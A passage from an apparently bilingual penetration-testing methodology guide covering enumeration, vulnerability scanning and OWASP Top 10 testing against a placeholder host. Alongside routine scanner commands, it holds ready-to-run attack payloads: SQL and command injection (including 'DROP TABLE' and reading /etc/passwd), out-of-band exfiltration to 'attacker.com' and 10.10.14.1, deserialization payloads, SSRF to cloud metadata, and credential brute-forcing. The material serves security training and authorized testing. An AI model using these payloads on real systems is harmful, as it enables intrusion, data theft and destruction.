# Try: anonymous / anonymous or ftp / ftp

# Nmap FTP scripts
nmap --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221 -p 21 10.10.10.1
```

#### 2. FTP Bruteforce
```bash
# Hydra brute force
hydra -L users.txt -P passwords.txt ftp://10.10.10.1

# Nmap brute force
nmap --script ftp-brute --script-args userdb=users.txt,passdb=passwords.txt -p 21 10.10.10.1
```

### SNMP Enumeration (Puerto 161)

#### 1. SNMP Walking
```bash
# SNMPwalk
snmpwalk -c public -v1 10.10.10.1
snmpwalk -c private -v1 10.10.10.1
snmpwalk -c manager -v1 10.10.10.1

# Specific OIDs
snmpwalk -c public -v1 10.10.10.1 1.3.6.1.2.1.1  # System info
snmpwalk -c public -v1 10.10.10.1 1.3.6.1.2.1.25.4.2.1.2  # Running processes
snmpwalk -c public -v1 10.10.10.1 1.3.6.1.2.1.25.6.3.1.2  # Installed software
```

#### 2. SNMP Tools
```bash
# snmp-check
snmp-check 10.10.10.1 -c public

# onesixtyone - SNMP scanner
onesixtyone -c community.txt 10.10.10.1

# SNMPenum
snmpenum 10.10.10.1 public windows.txt
```

### DNS Enumeration (Puerto 53)

#### 1. Zone Transfer Attempts
```bash
# Attempt zone transfer
dig axfr target.com @10.10.10.1
dig axfr @10.10.10.1 target.com

# DNS reconnaissance
dnsrecon -d target.com -n 10.10.10.1
dnsenum --dnsserver 10.10.10.1 target.com
```

#### 2. DNS Brute Forcing
```bash
# Subdomain brute forcing
dnsrecon -d target.com -D /usr/share/wordlists/dnsmap.txt -t brt

# Reverse DNS lookup
dnsrecon -r 10.10.10.0/24 -n 10.10.10.1
```

### LDAP Enumeration (Puerto 389/636)

#### 1. Basic LDAP Queries
```bash
# Anonymous bind test
ldapsearch -x -h 10.10.10.1 -s base namingcontexts

# Dump LDAP information
ldapsearch -x -h 10.10.10.1 -s sub -b "DC=domain,DC=local"

# Search for users
ldapsearch -x -h 10.10.10.1 -s sub -b "DC=domain,DC=local" "(objectClass=user)"
```

#### 2. LDAP Tools
```bash
# ldapenum
python3 ldapenum.py 10.10.10.1

# windapsearch
python3 windapsearch.py -d domain.local --dc-ip 10.10.10.1 -U
```

### Service-Specific Scripts and Automation

#### 1. AutoRecon - Automated Enumeration
```bash
# Install AutoRecon
pip3 install autorecon

# Run comprehensive enumeration
autorecon 10.10.10.1

# Multiple targets
autorecon 10.10.10.0/24 -t targets.txt
```

#### 2. Custom Enumeration Script
```bash
#!/bin/bash
# enum_all.sh - Comprehensive service enumeration

TARGET=$1
WORDLIST="/usr/share/wordlists/dirb/common.txt"

echo "[+] Starting enumeration for $TARGET"

# Port scan
echo "[+] Running Nmap scan..."
nmap -sC -sV -oA nmap_$TARGET $TARGET

# HTTP enumeration if port 80 is open
if nmap -p 80 $TARGET | grep -q "open"; then
    echo "[+] HTTP enumeration..."
    gobuster dir -u http://$TARGET -w $WORDLIST -x php,html,txt -o http_enum.txt
    whatweb http://$TARGET
    nikto -h http://$TARGET -o nikto_results.txt
fi

# HTTPS enumeration if port 443 is open
if nmap -p 443 $TARGET | grep -q "open"; then
    echo "[+] HTTPS enumeration..."
    gobuster dir -u https://$TARGET -w $WORDLIST -x php,html,txt -o https_enum.txt
    sslscan $TARGET:443
fi

# SMB enumeration if ports 139/445 are open
if nmap -p 139,445 $TARGET | grep -q "open"; then
    echo "[+] SMB enumeration..."
    enum4linux -a $TARGET > smb_enum.txt
    smbmap -H $TARGET
fi

echo "[+] Enumeration completed for $TARGET"
```

---

## 🔍 Fase 4: Análisis de Vulnerabilidades
### Objetivo
Identificar y analizar vulnerabilidades en los servicios descubiertos, priorizando por impacto y probabilidad de explotación exitosa.

### Automated Vulnerability Scanning

#### 1. Nmap Vulnerability Scripts
```bash
# Update NSE scripts
nmap --script-updatedb

# Comprehensive vulnerability scan
nmap --script vuln -p 80,443,445,22,21,25,53,110,143,993,995,1433,3306,3389,5432 10.10.10.1

# Specific vulnerability categories
nmap --script vuln,exploit -p- 10.10.10.1
nmap --script safe -p- 10.10.10.1

# SMB-specific vulnerabilities
nmap --script smb-vuln-* -p 445 10.10.10.1

# Web application vulnerabilities
nmap --script http-vuln-* -p 80,443 10.10.10.1

# SSL/TLS vulnerabilities
nmap --script ssl-* -p 443 10.10.10.1

# Database-specific vulnerabilities
nmap --script mysql-vuln-* -p 3306 10.10.10.1
nmap --script ms-sql-* -p 1433 10.10.10.1
nmap --script oracle-* -p 1521 10.10.10.1

# SSH vulnerabilities
nmap --script ssh2-enum-algos,ssh-hostkey,ssh-auth-methods -p 22 10.10.10.1

# FTP vulnerabilities
nmap --script ftp-* -p 21 10.10.10.1

# DNS vulnerabilities
nmap --script dns-* -p 53 10.10.10.1

# SNMP vulnerabilities
nmap --script snmp-* -p 161 10.10.10.1
```

#### 2. OpenVAS/Greenbone Vulnerability Scanner
```bash
# Install and setup OpenVAS
sudo apt update && sudo apt install openvas
sudo gvm-setup

# Start services
sudo gvm-start

# Web interface available at https://127.0.0.1:9392
# Default credentials: admin / generated_password

# Command line scanning with gvm-cli
gvm-cli socket --xml "<create_target><name>Target1</name><hosts>10.10.10.1-10</hosts></create_target>"
gvm-cli socket --xml "<create_task><name>Full Scan</name><target id='target-id'/><config id='full-fast-config-id'/></create_task>"
gvm-cli socket --xml "<start_task task_id='task-id'/>"

# Export results
gvm-cli socket --xml "<get_reports report_id='report-id' format_id='pdf-format-id'/>" > vulnerability_report.pdf
```

#### 3. Nuclei - Fast Vulnerability Scanner
```bash
# Install nuclei
go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest

# Update templates
nuclei -update-templates

# Basic vulnerability scan
nuclei -u http://10.10.10.1
nuclei -u https://10.10.10.1

# Scan with specific severity
nuclei -u http://10.10.10.1 -severity critical,high
nuclei -u http://10.10.10.1 -severity medium,low

# Scan multiple targets
nuclei -l targets.txt -o nuclei_results.txt

# Custom templates directory
nuclei -u http://10.10.10.1 -t ~/custom-templates/

# Technology-specific scans
nuclei -u http://10.10.10.1 -tags wordpress,apache,ssl,sqli,xss
nuclei -u http://10.10.10.1 -tags joomla,drupal,cms

# Network service scanning
nuclei -u 10.10.10.1 -tags network,service,tcp
nuclei -u 10.10.10.1:445 -tags smb

# Configuration and exposure checks
nuclei -u http://10.10.10.1 -tags config,exposure,misconfig

# Rate limiting and threads
nuclei -u http://10.10.10.1 -rate-limit 10 -threads 5

# Custom wordlist for fuzzing
nuclei -u http://10.10.10.1 -w /usr/share/wordlists/dirb/common.txt

# JSON output for automation
nuclei -u http://10.10.10.1 -json -o nuclei_results.json

# Silent mode with specific output
nuclei -u http://10.10.10.1 -silent -nc | grep -E "(CRITICAL|HIGH)"
```

#### 4. Vulnerability Research and CVE Analysis
```bash
# SearchSploit - Local exploit database
searchsploit apache 2.4.29
searchsploit -m 47887  # Mirror exploit locally
searchsploit -p 47887  # Show path to exploit
searchsploit -w apache # Web search
searchsploit --colour # Colored output

# Advanced SearchSploit queries
searchsploit -s "remote code execution" linux
searchsploit -t windows local privilege
searchsploit --json apache 2.4 > apache_exploits.json

# CVE Details lookup and automation
curl -s "https://cvedetails.com/json-feed.php?numrows=10&vendor_id=45&product_id=66&version_id=" | jq '.'

# CVE search with CVE-Search
git clone https://github.com/cve-search/cve-search.git
cd cve-search
python3 -m venv venv && source venv/bin/activate
pip install -r requirements.txt
./sbin/db_mgmt.py -p
./bin/search.py -p apache -o 2.4.29

# Shodan API for vulnerability intelligence
shodan search "apache 2.4.29" --fields ip_str,port,org,hostnames
shodan host 10.10.10.1

# Online vulnerability databases automation
# - CVE Details: https://www.cvedetails.com/
# - NVD: https://nvd.nist.gov/
# - Exploit-DB: https://www.exploit-db.com/
# - Packet Storm: https://packetstormsecurity.com/

# Custom vulnerability correlation script
cat << 'EOF' > vuln_correlate.py
#!/usr/bin/env python3
import requests
import json
import sys

def search_cve(software, version):
    # Example CVE correlation script
    cve_api = f"https://services.nvd.nist.gov/rest/json/cves/1.0"
    params = {
        'keyword': f'{software} {version}',
        'resultsPerPage': 20
    }
    
    try:
        response = requests.get(cve_api, params=params)
        data = response.json()
        
        for item in data.get('result', {}).get('CVE_Items', []):
            cve_id = item['cve']['CVE_data_meta']['ID']
            description = item['cve']['description']['description_data'][0]['value']
            print(f"CVE: {cve_id}")
            print(f"Description: {description[:200]}...")
            print("-" * 50)
            
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 vuln_correlate.py <software> <version>")
        sys.exit(1)
    
    search_cve(sys.argv[1], sys.argv[2])
EOF

chmod +x vuln_correlate.py
python3 vuln_correlate.py apache 2.4.29
```

### Web Application Vulnerability Assessment

#### 1. OWASP Top 10 Testing Methodology

##### A01: Broken Access Control
```bash
# Directory traversal testing
curl "http://10.10.10.1/page.php?file=../../../etc/passwd"
curl "http://10.10.10.1/page.php?file=....//....//....//etc/passwd"
curl "http://10.10.10.1/page.php?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"

# Parameter pollution
curl "http://10.10.10.1/user.php?id=1&id=2"
curl "http://10.10.10.1/user.php?id[]=1&id[]=2"

# HTTP method testing
curl -X OPTIONS http://10.10.10.1/admin/
curl -X PUT http://10.10.10.1/upload.php -d "test data"
curl -X DELETE http://10.10.10.1/user/1
curl -X PATCH http://10.10.10.1/user/1 -d '{"admin": true}'

# IDOR (Insecure Direct Object Reference)
curl "http://10.10.10.1/profile.php?id=1"
curl "http://10.10.10.1/profile.php?id=2"
curl "http://10.10.10.1/documents/user1/private.pdf"
curl "http://10.10.10.1/documents/user2/private.pdf"

# Session fixation testing
curl -c cookies.txt "http://10.10.10.1/login.php"
curl -b "PHPSESSID=attacker_session" "http://10.10.10.1/login.php" -d "user=admin&pass=password"

# Privilege escalation testing
curl -b cookies.txt "http://10.10.10.1/admin/" # With user cookies
curl -H "X-Forwarded-For: 127.0.0.1" "http://10.10.10.1/admin/"
curl -H "X-Original-URL: /admin" "http://10.10.10.1/"
```

##### A02: Cryptographic Failures
```bash
# SSL/TLS comprehensive testing
sslscan 10.10.10.1:443
sslyze --regular 10.10.10.1:443
testssl.sh https://10.10.10.1

# Weak cipher detection
nmap --script ssl-enum-ciphers -p 443 10.10.10.1
nmap --script ssl-cert,ssl-date,ssl-dh-params,ssl-enum-ciphers,ssl-google-cert-catalog,ssl-heartbleed,ssl-known-key,ssl-poodle,ssl-ccs-injection -p 443 10.10.10.1

# Certificate analysis
echo | openssl s_client -connect 10.10.10.1:443 2>/dev/null | openssl x509 -text -noout

# Weak hash detection in application
curl -s "http://10.10.10.1/" | grep -i -E "(md5|sha1)[^a-z]"
curl -s "http://10.10.10.1/js/" | grep -i -E "md5|sha1"

# Client-side crypto testing
curl -s "http://10.10.10.1/" | grep -i -E "(crypto-js|sjcl|forge)"

# Cookie security analysis
curl -I "http://10.10.10.1/login.php" | grep -i "set-cookie"
curl -I "https://10.10.10.1/login.php" | grep -i -E "(secure|httponly|samesite)"
```

##### A03: Injection Vulnerabilities
```bash
# SQL Injection comprehensive testing with SQLMap
sqlmap -u "http://10.10.10.1/page.php?id=1" --batch --dbs
sqlmap -u "http://10.10.10.1/page.php?id=1" --batch --current-user --current-db
sqlmap -u "http://10.10.10.1/page.php?id=1" --batch --tables -D database_name
sqlmap -u "http://10.10.10.1/page.php?id=1" --batch --dump -T users -D database_name
sqlmap -u "http://10.10.10.1/page.php?id=1" --batch --os-shell
sqlmap -u "http://10.10.10.1/page.php?id=1" --batch --file-read="/etc/passwd"
sqlmap -u "http://10.10.10.1/page.php?id=1" --batch --sql-query="SELECT version()"

# POST parameter SQLi
sqlmap -r request.txt --batch --level=5 --risk=3
sqlmap -u "http://10.10.10.1/login.php" --data="username=admin&password=test" --batch --dbs

# JSON SQLi
sqlmap -u "http://10.10.10.1/api/user" --data='{"id": 1}' --content-type="application/json" --batch --dbs

# SQLi with custom headers
sqlmap -u "http://10.10.10.1/" --headers="X-Forwarded-For: 127.0.0.1*" --batch --dbs
sqlmap -u "http://10.10.10.1/" --cookie="sessionid=123*" --batch --dbs

# Manual SQL injection testing
curl "http://10.10.10.1/page.php?id=1'"
curl "http://10.10.10.1/page.php?id=1 OR 1=1--"
curl "http://10.10.10.1/page.php?id=1; DROP TABLE users;--"
curl "http://10.10.10.1/page.php?id=1 UNION SELECT 1,2,3,4,5--"
curl "http://10.10.10.1/page.php?id=1 UNION SELECT @@version,user(),database(),4,5--"

# Time-based blind SQLi
curl "http://10.10.10.1/page.php?id=1 AND (SELECT SLEEP(5))--"
curl "http://10.10.10.1/page.php?id=1; WAITFOR DELAY '00:00:05'--"

# Boolean-based blind SQLi
curl "http://10.10.10.1/page.php?id=1 AND 1=1--" # Should work normally
curl "http://10.10.10.1/page.php?id=1 AND 1=2--" # Should break/change response

# NoSQL injection
curl "http://10.10.10.1/api/users" -d '{"username": {"$ne": ""}, "password": {"$ne": ""}}'
curl "http://10.10.10.1/api/users" -d '{"username": {"$gt": ""}, "password": {"$gt": ""}}'
curl "http://10.10.10.1/login" -d 'username[$ne]=admin&password[$ne]=admin'

# LDAP injection
curl "http://10.10.10.1/search?name=*)(uid=*))(|(uid=*"
curl "http://10.10.10.1/search?name=admin)(|(password=*))"

# Command injection comprehensive testing
curl "http://10.10.10.1/ping.php?host=127.0.0.1; id"
curl "http://10.10.10.1/ping.php?host=127.0.0.1 | whoami"
curl "http://10.10.10.1/ping.php?host=127.0.0.1 && cat /etc/passwd"
curl "http://10.10.10.1/ping.php?host=\$(whoami)"
curl "http://10.10.10.1/ping.php?host=\`id\`"

# Command injection with encoding
curl "http://10.10.10.1/ping.php?host=%31%32%37%2e%30%2e%30%2e%31%3b%69%64" # 127.0.0.1;id
curl "http://10.10.10.1/ping.php?host=127.0.0.1%0aid" # Newline injection

# Blind command injection with time delays
curl "http://10.10.10.1/ping.php?host=127.0.0.1; sleep 10"
curl "http://10.10.10.1/ping.php?host=127.0.0.1 && timeout 10"

# Out-of-band command injection
curl "http://10.10.10.1/ping.php?host=127.0.0.1; curl http://10.10.14.1:8080/\$(whoami)"
curl "http://10.10.10.1/ping.php?host=127.0.0.1; nslookup \$(whoami).attacker.com"
```

##### A04: Insecure Design Testing
```bash
# Business logic testing
curl -X POST "http://10.10.10.1/transfer.php" -d "from=user1&to=user2&amount=-1000"
curl -X POST "http://10.10.10.1/purchase.php" -d "item=laptop&quantity=-1&price=1500"
curl -X POST "http://10.10.10.1/discount.php" -d "code=SAVE10&apply_times=1000"

# Workflow bypass testing
curl -X POST "http://10.10.10.1/step3.php" -d "data=test"  # Skip step 1 and 2
curl -X GET "http://10.10.10.1/confirm_payment.php?order_id=123&skip_payment=1"

# Race condition testing
for i in {1..10}; do
    curl -X POST "http://10.10.10.1/vote.php" -d "candidate=1" &
done
wait

# Price manipulation
curl -X POST "http://10.10.10.1/checkout.php" -d "item_id=1&price=0.01"
curl -X POST "http://10.10.10.1/checkout.php" -d "item_id=1&discount=99.99"

# Session logic flaws
curl -c session1.txt "http://10.10.10.1/login.php" -d "user=user1&pass=pass1"
curl -c session2.txt "http://10.10.10.1/login.php" -d "user=user2&pass=pass2"
curl -b session1.txt "http://10.10.10.1/transfer.php" -d "from=user2&to=user1&amount=1000"
```

##### A05: Security Misconfiguration
```bash
# Default credentials testing
hydra -C /usr/share/seclists/Passwords/Default-Credentials/default-passwords.csv http-get://10.10.10.1/admin/
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://10.10.10.1
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt ssh://10.10.10.1

# Information disclosure testing
curl -s http://10.10.10.1/.env
curl -s http://10.10.10.1/.git/config
curl -s http://10.10.10.1/.svn/entries
curl -s http://10.10.10.1/.DS_Store
curl -s http://10.10.10.1/backup.zip
curl -s http://10.10.10.1/database.sql
curl -s http://10.10.10.1/config.php.bak
curl -s http://10.10.10.1/web.config
curl -s http://10.10.10.1/WEB-INF/web.xml
curl -s http://10.10.10.1/META-INF/MANIFEST.MF

# Server status pages
curl -s http://10.10.10.1/server-status
curl -s http://10.10.10.1/server-info
curl -s http://10.10.10.1/status
curl -s http://10.10.10.1/info.php
curl -s http://10.10.10.1/phpinfo.php

# Directory listings
curl -s http://10.10.10.1/uploads/
curl -s http://10.10.10.1/files/
curl -s http://10.10.10.1/backup/
curl -s http://10.10.10.1/temp/
curl -s http://10.10.10.1/logs/

# HTTP methods testing
curl -X TRACE http://10.10.10.1/
curl -X OPTIONS http://10.10.10.1/ -v
curl -X PUT http://10.10.10.1/test.txt -d "test content"
curl -X DELETE http://10.10.10.1/test.txt

# Security headers analysis
curl -I http://10.10.10.1/ | grep -i -E "(x-frame-options|x-content-type-options|x-xss-protection|strict-transport-security|content-security-policy)"

# Error message disclosure
curl "http://10.10.10.1/nonexistent.php"
curl "http://10.10.10.1/page.php?id=abc"
curl -X POST "http://10.10.10.1/login.php" -d "malformed json data"
```

##### A06: Vulnerable and Outdated Components
```bash
# Component identification with retire.js
retire --js --outputformat json --outputpath retire_results.json http://10.10.10.1
retire --js --outputpath retire_results.txt http://10.10.10.1

# WordPress vulnerability scanning
wpscan --url http://10.10.10.1 --enumerate ap,at,u,dbe
wpscan --url http://10.10.10.1 --enumerate vp,vt --plugins-detection mixed --api-token YOUR_API_TOKEN
wpscan --url http://10.10.10.1 --passwords /usr/share/wordlists/rockyou.txt --usernames admin

# Joomla vulnerability scanning
joomscan -u http://10.10.10.1
joomscan -u http://10.10.10.1 --enumerate-components

# Drupal vulnerability scanning
droopescan scan drupal -u http://10.10.10.1
droopescan scan drupal -u http://10.10.10.1 --enumerate p,t,u

# Generic CMS and framework detection
whatweb http://10.10.10.1 -a 3
webtech -u http://10.10.10.1
wig http://10.10.10.1

# JavaScript libraries analysis
curl -s http://10.10.10.1/ | grep -oE "jquery-[0-9]+\.[0-9]+\.[0-9]+"
curl -s http://10.10.10.1/ | grep -oE "bootstrap[/-][0-9]+\.[0-9]+\.[0-9]+"
curl -s http://10.10.10.1/ | grep -oE "angular[/-][0-9]+\.[0-9]+\.[0-9]+"

# Dependency analysis for Node.js applications
npm audit --json > npm_audit.json  # If package.json is accessible
yarn audit --json > yarn_audit.json  # If yarn.lock is accessible

# Version disclosure in headers and responses
curl -I http://10.10.10.1/ | grep -i server
curl -I http://10.10.10.1/ | grep -i x-powered-by
curl -s http://10.10.10.1/README.txt
curl -s http://10.10.10.1/CHANGELOG.txt
curl -s http://10.10.10.1/VERSION
```

##### A07: Identification and Authentication Failures
```bash
# Brute force attack testing
hydra -l admin -P /usr/share/wordlists/rockyou.txt http-post-form://10.10.10.1/login.php:"username=^USER^&password=^PASS^:Invalid"
hydra -L users.txt -P passwords.txt http-post-form://10.10.10.1/login.php:"user=^USER^&pass=^PASS^:failed"

# Account enumeration
curl "http://10.10.10.1/forgot.php" -d "email=admin@target.com"  # Valid user
curl "http://10.10.10.1/forgot.php" -d "email=nonexistent@target.com"  # Invalid user

# Password reset vulnerabilities
curl "http://10.10.10.1/reset.php?token=123456&user=admin"
curl "http://10.10.10.1/reset.php?token=123456&user=victim"

# Session management testing
curl -c cookies.txt "http://10.10.10.1/login.php" -d "user=admin&pass=password"
curl -b cookies.txt "http://10.10.10.1/profile.php"
# Log out and test if session is properly invalidated
curl "http://10.10.10.1/logout.php"
curl -b cookies.txt "http://10.10.10.1/profile.php"

# Weak password policy testing
curl "http://10.10.10.1/register.php" -d "user=test&pass=123&email=test@test.com"
curl "http://10.10.10.1/register.php" -d "user=test2&pass=password&email=test2@test.com"

# Multi-factor authentication bypass
curl "http://10.10.10.1/login.php" -d "user=admin&pass=password&skip_2fa=1"
curl "http://10.10.10.1/verify_2fa.php" -d "code=000000"  # Try common codes

# JWT token analysis (if JWT is used)
# Decode JWT tokens found in cookies or headers
python3 -c "
import base64
import json
token = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4iLCJleHAiOjE2MzIyNDc4NDB9.signature'
header, payload, signature = token.split('.')
header_decoded = json.loads(base64.b64decode(header + '==').decode())
payload_decoded = json.loads(base64.b64decode(payload + '==').decode())
print('Header:', header_decoded)
print('Payload:', payload_decoded)
"
```

##### A08: Software and Data Integrity Failures
```bash
# Insecure deserialization testing
# PHP deserialization
curl "http://10.10.10.1/profile.php" -d "data=O:8:\"stdClass\":1:{s:4:\"name\";s:5:\"admin\";}"

# Java deserialization (if Java application)
java -jar ysoserial.jar URLDNS http://10.10.14.1/ > payload.ser
curl "http://10.10.10.1/upload" -F "file=@payload.ser"

# .NET deserialization
# Look for ViewState or other serialized data in forms

# Supply chain attack simulation
curl -s http://10.10.10.1/ | grep -oE "https?://[^\"']+" | grep -E "(cdn|ajax|googleapis)"

# Integrity verification
curl -s http://10.10.10.1/ | grep -i integrity
curl -s http://10.10.10.1/ | grep -i "sri"  # Subresource Integrity

# Update mechanism testing
curl "http://10.10.10.1/update.php"
curl "http://10.10.10.1/admin/update" -X POST
```

##### A09: Security Logging and Monitoring Failures
```bash
# Log injection testing
curl "http://10.10.10.1/login.php" -d "username=admin%0aFAKE_LOG_ENTRY&password=test"
curl "http://10.10.10.1/search.php?q=test%0d%0aINJECTED_LOG"

# Error handling analysis
curl "http://10.10.10.1/error_prone_page.php?param=<script>alert(1)</script>"
curl "http://10.10.10.1/debug.php?debug=1"

# Admin interface discovery
gobuster dir -u http://10.10.10.1 -w /usr/share/wordlists/dirb/common.txt -x php | grep -E "(admin|manage|control|dashboard)"

# Monitoring evasion testing
curl -H "User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "http://10.10.10.1/admin/"
curl -H "X-Forwarded-For: 127.0.0.1" "http://10.10.10.1/restricted/"
```

##### A10: Server-Side Request Forgery (SSRF)
```bash
# Basic SSRF testing
curl "http://10.10.10.1/fetch.php?url=http://127.0.0.1:22"
curl "http://10.10.10.1/fetch.php?url=http://localhost/admin"
curl "http://10.10.10.1/fetch.php?url=file:///etc/passwd"

# Cloud metadata SSRF
curl "http://10.10.10.1/fetch.php?url=http://169.254.169.254/latest/meta-data/"
curl "http://10.10.10.1/fetch.php?url=http://metadata.google.internal/computeMetadata/v1/"

# Internal network scanning via SSRF
for i in {1..254}; do
    curl "http://10.10.10.1/fetch.php?url=http://192.168.1.$i:80" &
done

# Protocol smuggling
curl "http://10.10.10.1/fetch.php?url=dict://127.0.0.1:6379/info"
curl "http://10.10.10.1/fetch.php?url=gopher://127.0.0.1:6379/_info"

# SSRF with URL encoding and bypasses
curl "http://10.10.10.1/fetch.php?url=http://localhost%23.attacker.com/"
curl "http://10.10.10.1/fetch.php?url=http://127.1:80/"
curl "http://10.10.10.1/fetch.php?url=http://[::1]:80/"
```

#### 2. Automated Web Vulnerability Scanners

##### OWASP ZAP (Zed Attack Proxy)
```bash
# ZAP Baseline scan
docker run -v $(pwd):/zap/wrk/:rw -t owasp/zap2docker-stable zap-baseline.py -t http://10.10.10.1

# ZAP Full scan
docker run -v $(pwd):/zap/wrk/:rw -t owasp/zap2docker-stable zap-full-scan.py -t http://10.10.10.1

# ZAP API scan with custom config
docker run -v $(pwd):/zap/wrk/:rw -t owasp/zap2docker-stable zap-api-scan.py -t http://10.10.10.1/api/openapi.json -f openapi

# ZAP with authentication
docker run -v $(pwd):/zap/wrk/:rw -t owasp/zap2docker-stable zap-full-scan.py -t http://10.10.10.1 -I

# Manual ZAP usage
zaproxy
# GUI: http://127.0.0.1:8080
```

##### Burp Suite Professional
```bash
# Command line scanning (requires license)
java -jar burpsuite_pro.jar --project-file=project.burp --config-file=config.json

# Burp Suite REST API
curl -X POST http://127.0.0.1:1337/burp/scanner/scans/active \
  -H "Content-Type: application/json" \
  -d '{"scope":{"url":"http://10.10.10.1"}}'

# Export scan results
curl -X GET http://127.0.0.1:1337/burp/report \
  -H "Accept: application/json" \
  > burp_scan_results.json
```

##### Nikto - Web Server Scanner
```bash
# Basic Nikto scan
nikto -h http://10.10.10.1
nikto -h https://10.10.10.1 -ssl

# Comprehensive scan with all plugins
nikto -h http://10.10.10.1 -Plugins @@ALL -o nikto_full_results.txt

# Specific plugin categories
nikto -h http://10.10.10.1 -Plugins "apache_expect_xss,cgi,cookies,headers"

# Custom tuning options
nikto -h http://10.10.10.1 -Tuning 123456789 -Format htm -output nikto_report.html

# Multiple hosts scan
nikto -h hosts.txt -Format csv -output nikto_multi_results.csv

# Evasion techniques
nikto -h http://10.10.10.1 -evasion 1234 -mutate 4
```

##### WhatWeb - Technology Identification
```bash
# Basic identification
whatweb http://10.10.10.1

# Aggressive scan
whatweb -a 3 http://10.10.10.1

# Specific technology detection
whatweb --log-verbose http://10.10.10.1

# Multiple targets
whatweb -i targets.txt -v

# JSON output
whatweb --log-json=whatweb_results.json http://10.10.10.1
```

### Network Vulnerability Assessment

#### 1. SMB Vulnerabilities
```bash
# EternalBlue (MS17-010) detection and variants
nmap --script smb-vuln-ms17-010 -p 445 10.10.10.1
nmap --script smb-vuln-ms17-010,smb-vuln-cve2017-7494 -p 445 10.10.10.1

# SMB signing detection
nmap --script smb-security-mode,smb2-security-mode -p 445 10.10.10.1

# SMBGhost (CVE-2020-0796) detection
nmap --script smb2-vuln-uptime -p 445 10.10.10.1

# BlueKeep (CVE-2019-0708) RDP vulnerability
nmap --script rdp-vuln-ms12-020 -p 3389 10.10.10.1

# SMB enumeration with vulnerabilities
enum4linux -a 10.10.10.1 | grep -i vuln
smbmap -H 10.10.10.1 --admin-check

# Advanced SMB vulnerability testing
smbver.sh 10.10.10.1
rpcclient -N 10.10.10.1 -c "srvinfo"

# SMBv1 deprecation check
nmap --script smb-protocols -p 445 10.10.10.1

# NetBIOS vulnerabilities
nbtscan 10.10.10.1
nmap --script nbstat -p 137 10.10.10.1
```

#### 2. SSL/TLS Vulnerabilities
```bash
# Comprehensive SSL/TLS testing
testssl.sh https://10.10.10.1 --html --outfile testssl_results.html

# Heartbleed detection (CVE-2014-0160)
nmap --script ssl-heartbleed -p 443 10.10.10.1
openssl s_client -connect 10.10.10.1:443 -tlsextdebug 2>&1 | grep -i heartbeat

# POODLE detection (CVE-2014-3566)
nmap --script ssl-poodle -p 443 10.10.10.1

# BEAST detection (CVE-2011-3389)
nmap --script ssl-enum-ciphers -p 443 10.10.10.1 | grep -E "TLSv1.0|SSLv3"

# CRIME detection (CVE-2012-4929)
nmap --script ssl-enum-ciphers -p 443 10.10.10.1 | grep -i compression

# FREAK attack detection (CVE-2015-0204)
nmap --script ssl-enum-ciphers -p 443 10.10.10.1 | grep -i export

# Logjam attack detection (CVE-2015-4000)
nmap --script ssl-dh-params -p 443 10.10.10.1

# DROWN attack detection (CVE-2016-0800)
nmap --script ssl-drown -p 443 10.10.10.1

# Certificate validation
echo | openssl s_client -connect 10.10.10.1:443 -verify 5 -CApath /etc/ssl/certs

# Cipher suite analysis
sslscan --show-certificate --no-colour 10.10.10.1:443
sslyze --certinfo --compression --reneg --sslv2 --sslv3 10.10.10.1:443

# TLS version testing
for version in ssl2 ssl3 tls1 tls1_1 tls1_2 tls1_3; do
  echo "Testing $version:"
  echo | timeout 3 openssl s_client -connect 10.10.10.1:443 -$version 2>/dev/null && echo "Supported" || echo "Not supported"
done
```

#### 3. Database Vulnerabilities
```bash
# MySQL vulnerabilities and enumeration
nmap --script mysql-* -p 3306 10.10.10.1
nmap --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 -p 3306 10.10.10.1

# MySQL brute force
nmap --script mysql-brute -p 3306 10.10.10.1
hydra -L users.txt -P passwords.txt mysql://10.10.10.1:3306

# PostgreSQL vulnerabilities
nmap --script pgsql-brute -p 5432 10.10.10.1
nmap --script pgsql-databases,pgsql-users -p 5432 10.10.10.1

# MSSQL vulnerabilities
nmap --script ms-sql-* -p 1433 10.10.10.1
nmap --script ms-sql-brute,ms-sql-config,ms-sql-dump-hashes,ms-sql-empty-password,ms-sql-hasdbaccess,ms-sql-info,ms-sql-ntlm-info,ms-sql-tables,ms-sql-xp-cmdshell -p 1433 10.10.10.1

# Oracle vulnerabilities
nmap --script oracle-* -p 1521 10.10.10.1
nmap --script oracle-brute,oracle-enum-users,oracle-sid-brute -p 1521 10.10.10.1

# MongoDB enumeration
nmap --script mongodb-* -p 27017 10.10.10.1

# Redis vulnerabilities
nmap --script redis-* -p 6379 10.10.10.1
redis-cli -h 10.10.10.1 info

# Database connection testing
mysql -h 10.10.10.1 -u root -p
psql -h 10.10.10.1 -U postgres
sqlcmd -S 10.10.10.1 -U sa
```

#### 4. Service-Specific Vulnerabilities
```bash
# SSH vulnerabilities
nmap --script ssh-* -p 22 10.10.10.1
nmap --script ssh-auth-methods,ssh-brute,ssh-hostkey,ssh-publickey-acceptance -p 22 10.10.10.1

# FTP vulnerabilities
nmap --script ftp-* -p 21 10.10.10.1
nmap --script ftp-anon,ftp-bounce,ftp-brute,ftp-libopie,ftp-proftpd-backdoor,ftp-syst,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221 -p 21 10.10.10.1

# Telnet vulnerabilities
nmap --script telnet-* -p 23 10.10.10.1

# SMTP vulnerabilities
nmap --script smtp-* -p 25 10.10.10.1
nmap --script smtp-brute,smtp-commands,smtp-enum-users,smtp-ntlm-info,smtp-open-relay,smtp-strangeport,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 10.10.10.1

# DNS vulnerabilities
nmap --script dns-* -p 53 10.10.10.1
